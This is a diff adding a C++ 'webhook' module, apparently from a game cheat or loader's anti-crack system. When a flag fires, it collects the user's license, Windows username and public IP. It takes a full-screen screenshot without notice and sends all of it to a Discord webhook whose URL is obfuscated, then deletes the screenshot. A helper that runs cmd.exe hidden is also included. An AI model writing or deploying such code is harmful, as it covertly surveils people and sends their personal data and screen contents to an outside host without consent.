@@ -1,0 +1,249 @@
+#include "webhook.h"
+
+#include <Windows.h>
+#include <string>
+#include <iostream>
+#include <stdio.h>
+#include <winhttp.h>
+#include <filesystem>
+#include <conio.h>
+#include <gdiplus.h>
+#include <thread>
+#include <fstream>
+#include "curl\include\curl\curl.h"
+
+#pragma comment(lib, "gdiplus.lib") 
+#pragma comment(lib, "winhttp.lib")
+
+#include "../../Crypt/skCrypter.h"
+#include "../encryption/obfstring.h"
+#include "../../nlohmann/json.hpp"
+
+using namespace Gdiplus;
+using namespace std;
+
+using json = nlohmann::json;
+
+#pragma warning(disable : 4996) 
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
+{
+    UINT num = 0;
+    UINT size = 0;
+
+    ImageCodecInfo* pImage = NULL;
+
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+
+    pImage = (ImageCodecInfo*)(malloc(size));
+    if (pImage == NULL) return -1;
+
+    GetImageEncoders(num, size, pImage);
+
+    for (UINT j = 0; j < num; ++j)
+    {
+        if (wcscmp(pImage[j].MimeType, format) == 0)
+        {
+            *pClsid = pImage[j].Clsid;
+            free(pImage);
+            return j;
+        }
+    }
+
+    free(pImage);
+    return -1;
+}
+
+int systemNoOutput(std::string command)
+{
+    command.insert(0, "/C ");
+
+    SHELLEXECUTEINFOA ShExecInfo = { 0 };
+    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+    ShExecInfo.hwnd = NULL;
+    ShExecInfo.lpVerb = NULL;
+    ShExecInfo.lpFile = "cmd.exe";
+    ShExecInfo.lpParameters = command.c_str();
+    ShExecInfo.lpDirectory = NULL;
+    ShExecInfo.nShow = SW_HIDE;
+    ShExecInfo.hInstApp = NULL;
+
+    if (ShellExecuteExA(&ShExecInfo) == FALSE)
+        return -1;
+
+    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
+
+    DWORD rv;
+    GetExitCodeProcess(ShExecInfo.hProcess, &rv);
+    CloseHandle(ShExecInfo.hProcess);
+
+    return rv;
+}
+
+std::string getLicense(std::string path) {
+    if (std::filesystem::exists(path)) {
+        std::ifstream file(path);
+        json data = json::parse(file);
+
+        return data["license"];
+    }
+    return "NOT_FOUND";
+}
+
+size_t ipWriteFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
+    data->append((char*)ptr, size * nmemb);
+    return size * nmemb;
+}
+
+std::string getIP() {
+
+    std::string response_string = "";
+
+    auto curl = curl_easy_init();
+
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org/");
+        curl_easy_setopt(curl, CURLOPT_NOBODY, 0L);
+        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 0L);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
+
+        std::string header_string;
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, ipWriteFunction);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
+        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
+
+        char* url;
+        long response_code;
+        double elapsed;
+        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
+        curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &elapsed);
+        curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &url);
+
+        curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+        curl = NULL;
+    }
+
+    return response_string;
+
+}
+
+void webhook::sendLog(std::string flag) {
+    char* username = getenv("USERNAME");
+    std::string imagePath = "C:\\ProgramData\\Screenshot.png";
+    std::string webhook = obfstring::deobfuscateString(skCrypt("igrtc?44fpkikqu4jtk6bubvq^g8Fv^Clkb36$BEE>AIA8D77Dg9DTIr{CrUmOBkLgD}ThVcQxUQ^i6CWvw}tHziOeZCMe").decrypt());
+
+    std::string field =
+        "{\"content\": \"||@everyone @here||\","
+        "\"embeds\": [{"
+        "\"title\": \"CRACK LOG\","
+        "\"color\": 16711680,"
+        "\"fields\": ["
+        "{\"name\": \"Username:\", \"value\": \"" + getLicense("C:\\Marcelin PVP.json") + "\"},"
+        "{\"name\": \"PCName:\", \"value\": \"" + username + "\"},"
+        "{\"name\": \"IP:\", \"value\": \"" + getIP() + "\"},"
+        "{\"name\": \"Flag:\", \"value\": \"" + flag + "\"}"
+        "]"
+        "}],"
+        "\"attachments\": []}";
+
+    int x = GetSystemMetrics(SM_CXSCREEN);
+    int y = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
+    HBITMAP hbmScreen = NULL;
+
+    GdiplusStartupInput gdip;
+    ULONG_PTR gdipToken;
+    GdiplusStartup(&gdipToken, &gdip, NULL);
+
+    hbmScreen = CreateCompatibleBitmap(hdcScreen, x, y);
+    SelectObject(hdcMemDC, hbmScreen);
+
+    BitBlt(hdcMemDC, 0, 0, x, y, hdcScreen, 0, 0, SRCCOPY);
+
+    CLSID encoderID;
+
+    GetEncoderClsid(L"image/png", &encoderID);
+
+    Bitmap* bmp = new Bitmap(hbmScreen, (HPALETTE)0);
+    bmp->Save(L"C:\\ProgramData\\Screenshot.png", &encoderID, NULL);
+
+    GdiplusShutdown(gdipToken);
+
+    DeleteObject(hbmScreen);
+    DeleteObject(hdcMemDC);
+    ReleaseDC(NULL, hdcScreen);
+
+    std::this_thread::sleep_for(std::chrono::milliseconds(40));
+
+    CURL* curl;
+    CURLcode res;
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    if (auto* const curl = curl_easy_init())
+    {
+        struct curl_slist* headers = nullptr;
+        headers = curl_slist_append(headers, "Content-Type: application/json");
+
+        curl_easy_setopt(curl, CURLOPT_URL, webhook.c_str());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, field.c_str());
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, ipWriteFunction);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, nullptr);
+
+
+        const CURLcode res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+    }
+    curl_global_cleanup();
+
+    curl_mime* mime;
+    curl_mimepart* part;
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+    if (curl) {
+        mime = curl_mime_init(curl);
+
+        part = curl_mime_addpart(mime);
+        curl_mime_data(part, "{\"content\": \"Image upload\",\"embeds\": [],\"attachments\": [{\"id\": 0}]}", CURL_ZERO_TERMINATED);
+        curl_mime_type(part, "application/json");
+
+        part = curl_mime_addpart(mime);
+        curl_mime_filedata(part, imagePath.c_str());
+        curl_mime_type(part, "image/png");
+        curl_mime_filename(part, "image.png");
+        curl_mime_name(part, "file0");
+
+        struct curl_slist* headers = nullptr;
+        headers = curl_slist_append(headers, "Content-Type: multipart/form-data");
+
+        curl_easy_setopt(curl, CURLOPT_URL, webhook.c_str());
+        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, ipWriteFunction);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, nullptr);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, nullptr);
+        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);                // Disable progress meter
+        curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
+
+        res = curl_easy_perform(curl);
+
+        curl_easy_cleanup(curl);
+        curl_mime_free(mime);
+        curl_slist_free_all(headers);
+    }
+    curl_global_cleanup();
+
+    std::filesystem::remove(imagePath);
+}
